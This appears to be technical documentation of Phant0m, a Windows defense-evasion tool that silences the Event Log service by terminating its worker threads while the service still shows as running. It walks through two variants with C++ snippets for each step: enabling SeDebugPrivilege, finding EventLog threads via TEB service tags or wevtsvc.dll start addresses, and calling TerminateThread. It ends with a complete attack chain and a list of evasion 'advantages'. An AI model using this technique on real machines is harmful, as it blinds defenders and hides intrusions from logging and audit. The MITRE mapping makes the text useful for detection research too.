# Phant0m - EventLog Evasion Technique

## Overview

Phant0m disables Windows Event Logging by terminating EventLog service worker threads instead of stopping the service. The service remains in "Running" state while being functionally disabled, bypassing traditional detection methods.

**Key Innovation**: Surgically terminates EventLog worker threads using TEB service tag identification, creating log silence without generating service stop events or modifying registry.

---

## Execution Flow

```
Common Steps (1-2):
  1. Privilege Validation
  2. Service Discovery
  
Branching Point -> Two Techniques:
  
  Technique 1 (TEB-based):           Technique 2 (Module-based):
    3. Resolve Native APIs              3. Resolve Native APIs
    4. Thread Enumeration               4. Thread Enumeration  
    5. TEB Service Tag Analysis         5. Thread Start Address
    6. Terminate Threads                6. Module Matching
                                        7. Terminate Threads
```

---

## Common Steps (Both Techniques)

### Step 1: Privilege Validation

**Code**: `../include/process_info.h`

Check current process integrity level (must be High/System) and enable SeDebugPrivilege to access SYSTEM-owned processes.

**Actions**:
1. Query `TokenIntegrityLevel` via `GetTokenInformation()` - must be High or System
2. Check `SeDebugPrivilege` status via `PrivilegeCheck()`
3. Enable privilege via `AdjustTokenPrivileges()` if needed

**APIs**: `OpenProcessToken()`, `GetTokenInformation()`, `LookupPrivilegeValue()`, `AdjustTokenPrivileges()`

---

### Step 2: Service Discovery

**Code**: `../include/pid_SCM.h` or `../include/pid_WMI.h`

Query EventLog service PID via Service Control Manager (default) or WMI (alternative).

**Method A - SCM (Default)**:
```cpp
OpenSCManagerA(NULL, NULL, SERVICE_QUERY_STATUS);
OpenServiceA(schSCManager, "EventLog", SERVICE_QUERY_STATUS);
QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, &ssProcess, ...);
return ssProcess.dwProcessId;
```

**Method B - WMI (Alternative)**:
Uses WMI COM interfaces to query service PID.

**Selection**: Controlled by `PID_FROM_SCM` / `PID_FROM_WMI` in `main.cpp`

**Result**: Both return PID of svchost.exe hosting EventLog service

---

## Technique 1: TEB Service Tag (Default)

**Code**: `../include/technique_1.h`

**Selection**: `#define KILL_WITH_T1 1` in `main.cpp`

### Step 3: Resolve Native APIs

Load undocumented/internal APIs for TEB-based thread identification:

```cpp
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
HMODULE hAdvapi32 = GetModuleHandleA("advapi32.dll");

NtQueryInformationThread = GetProcAddress(hNtdll, "NtQueryInformationThread");
I_QueryTagInformation = GetProcAddress(hAdvapi32, "I_QueryTagInformation");
```

**APIs Needed**:
- `NtQueryInformationThread()` - Get Thread Environment Block (TEB) address
- `I_QueryTagInformation()` - Translate service tag to service name

---

### Step 4: Thread Enumeration

Create system-wide thread snapshot:

```cpp
hThreads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
while (Thread32Next(hThreads, &te32)) {
    if (te32.th32OwnerProcessID == dwServicePID) {
        // This thread belongs to EventLog svchost
    }
}
```

**Parameters**: `TH32CS_SNAPTHREAD`, process ID = 0 (all system threads, filter later)

---

### Step 5: TEB Service Tag Analysis

**Core innovation**:

1. Open thread handle:
   ```cpp
   hEvtThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | 
                           THREAD_SUSPEND_RESUME | 
                           THREAD_TERMINATE, 
                           FALSE, te32.th32ThreadID);
   ```

2. Query TEB address:
   ```cpp
   NtQueryInformationThread(hEvtThread, 0, &tbi, 0x30, NULL);
   // tbi.pTebBaseAddress contains TEB address
   ```

3. Read service tag from TEB offset 0x1720 (x64):
   ```cpp
   ReadProcessMemory(hEvtProcess, pTebBaseAddress + 0x1720, &hTag, sizeof(HANDLE), NULL);
   ```

4. Translate service tag to name:
   ```cpp
   scTagQuery.processId = te32.th32OwnerProcessID;
   scTagQuery.serviceTag = hTag;
   I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &scTagQuery);
   StringCbPrintfA(serviceName, cbDest, "%ws", scTagQuery.pBuffer);
   ```

**Why This Works**: Windows assigns unique service tags to each service thread, stored in TEB structure at offset 0x1720. This enables precise identification of EventLog threads within shared svchost.exe.

---

### Step 6: Terminate Threads

```cpp
if (_stricmp(serviceName, "eventlog") == 0) {
    TerminateThread(hEvtThread, 0);
}
```

**Result**: EventLog worker threads terminated, service shows "Running" but cannot write events.

---

## Technique 2: Module-Based (Alternative)

**Code**: `../include/technique_2.h`

**Selection**: `#define KILL_WITH_T2 1` in `main.cpp`

### Step 3: Resolve Native APIs

Load Native API for thread start address query:

```cpp
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
NtQueryInformationThread = GetProcAddress(hNtdll, "NtQueryInformationThread");
```

**API Needed**:
- `NtQueryInformationThread()` - Get thread start address

---

### Step 4: Thread & Module Enumeration

Create process-specific snapshot with threads and modules:

```cpp
hEvtSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, dwServicePID);
while (Thread32Next(hEvtSnapshot, &te32)) {
    if (te32.th32OwnerProcessID == dwServicePID) {
        // Thread belongs to EventLog svchost
    }
}
```

**Parameters**: `TH32CS_SNAPALL` (threads + modules), process ID = dwServicePID (target process only)

---

### Step 5: Query Thread Start Address

Get thread start address via Native API:

```cpp
DuplicateHandle(hPeusdoCurrentProcess, hEvtThread, hPeusdoCurrentProcess, 
                &hNewThreadHandle, THREAD_QUERY_INFORMATION, FALSE, 0);
                
NtQueryInformationThread(hNewThreadHandle, 9, &dwThreadStartAddr, sizeof(DWORD64), NULL);
// ThreadInformationClass = 9 (ThreadQuerySetWin32StartAddress)
```

---

### Step 6: Module Matching

Match thread start address against loaded modules:

```cpp
Module32First(hEvtSnapshot, &me32);
while (Module32Next(hEvtSnapshot, &me32)) {
    if (dwThreadStartAddr >= (DWORD_PTR)me32.modBaseAddr && 
        dwThreadStartAddr <= ((DWORD_PTR)me32.modBaseAddr + me32.modBaseSize)) {
        StringCbPrintfA(moduleName, cbDest, "%ws", me32.szExePath);
        break;
    }
}
```

---

### Step 7: Terminate Threads

```cpp
if (strstr(moduleName, "wevtsvc.dll")) {
    TerminateThread(hEvtThread, 0);
}
```

**Logic**: EventLog service threads run from `wevtsvc.dll` module. Terminate threads whose start address falls within this module.

**Result**: Same as Technique 1 - EventLog worker threads terminated.

---

## MITRE ATT&CK Mapping

### T1562.002 - Impair Defenses: Disable Windows Event Logging

**Location**: Step 6 (Technique 1) / Step 7 (Technique 2)

**Implementation**: `TerminateThread(hEvtThread, 0)`

**Comparison**:

| Method | Traditional | Phant0m |
|--------|-------------|---------|
| sc stop eventlog | Event 7036 | Not used |
| Registry mod | Sysmon Event 13 | Not used |
| wevtutil cl | Event 1102 | Not used |
| Kill threads | Rare | Primary |

**Advantages**: Service "Running", no registry changes, no audit events, creates log gap.

---

### T1106 - Native API

**Location**: Steps 3-5 (both techniques)

**Technique 1 APIs**:

| API | Module | Type | Purpose |
|-----|--------|------|---------|
| `NtQueryInformationThread()` | ntdll.dll | Undocumented | Get TEB address |
| `I_QueryTagInformation()` | advapi32.dll | Internal | Service tag lookup |
| `ReadProcessMemory()` | kernel32.dll | Documented | Read TEB memory |

**Technique 2 APIs**:

| API | Module | Type | Purpose |
|-----|--------|------|---------|
| `NtQueryInformationThread()` | ntdll.dll | Undocumented | Get thread start address |
| `DuplicateHandle()` | kernel32.dll | Documented | Duplicate thread handle |

**Code Examples**:
```cpp
// Technique 1
NtQueryInformationThread(hEvtThread, 0, &tbi, 0x30, NULL);
ReadProcessMemory(hEvtProcess, pTebBaseAddress + 0x1720, &hTag, ...);
I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &scTagQuery);

// Technique 2
NtQueryInformationThread(hNewThreadHandle, 9, &dwThreadStartAddr, sizeof(DWORD64), NULL);
```

---

## Prerequisites

### Privilege Requirements

**Code**: `../include/process_info.h` - Step 1

Phant0m requires Administrator privileges to enable `SeDebugPrivilege`:

```cpp
// Check integrity level
GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, ...);
if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) { ... }

// Enable SeDebugPrivilege
LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
AdjustTokenPrivileges(hToken, FALSE, &tp, ...);
```

**Purpose of SeDebugPrivilege**:
- Access SYSTEM-owned processes (svchost.exe)
- Required for `OpenThread()`, `OpenProcess()`, `ReadProcessMemory()`
- Without this privilege, operations fail with `ACCESS_DENIED`

**Exploitation Points**:
1. `OpenThread()` - Access EventLog service threads (both techniques)
2. `OpenProcess()` - Access svchost.exe process memory (Technique 1)
3. `ReadProcessMemory()` - Read TEB from SYSTEM process (Technique 1)

---

## Complete Attack Chain

```
main() -> ServiceMaintenance()
  |
  +-- Step 1: Privilege Validation (Prerequisite)
  |            - enoughIntegrityLevel()
  |            - isPrivilegeOK() -> AdjustTokenPrivileges(SeDebugPrivilege)
  |
  +-- Step 2: Service Discovery (SCM or WMI)
  |    QueryServiceStatusEx("EventLog") -> PID
  |
  +-- Technique Selection (KILL_WITH_T1 or KILL_WITH_T2)
       |
       +-- [T1106 + T1562.002] Technique 1:
       |    |
       |    +-- Step 3: GetProcAddress("NtQueryInformationThread")
       |    |          GetProcAddress("I_QueryTagInformation")
       |    |
       |    +-- Step 4: CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
       |    |
       |    +-- Step 5: NtQueryInformationThread() -> TEB
       |    |          ReadProcessMemory(TEB+0x1720) -> tag
       |    |          I_QueryTagInformation() -> "eventlog"
       |    |
       |    +-- Step 6: TerminateThread()
       |
       +-- [T1106 + T1562.002] Technique 2:
            |
            +-- Step 3: GetProcAddress("NtQueryInformationThread")
            |
            +-- Step 4: CreateToolhelp32Snapshot(TH32CS_SNAPALL, PID)
            |
            +-- Step 5: NtQueryInformationThread(9) -> start address
            |
            +-- Step 6: Module32Next() -> match address to wevtsvc.dll
            |
            +-- Step 7: TerminateThread()
```

---

## Technical Summary

**Requirements**:
- OS: Windows Vista/2008+
- Architecture: x64 (Technique 1 TEB offset)
- Privileges: Administrator with SeDebugPrivilege

**Configuration** (`main.cpp`):
```cpp
// Service Discovery
#define PID_FROM_SCM 1  // SCM (default)
#define PID_FROM_WMI 0  // WMI (alternative)

// Thread Killing
#define KILL_WITH_T1 1  // TEB service tag (default)
#define KILL_WITH_T2 0  // Module-based (alternative)
```

**Key Advantages**:
- Service status "Running"
- No registry modifications
- No service stop events
- No audit log clear events
- Surgical precision

**MITRE ATT&CK Techniques**:
- T1562.002 - Impair Defenses: Disable Windows Event Logging
- T1106 - Native API

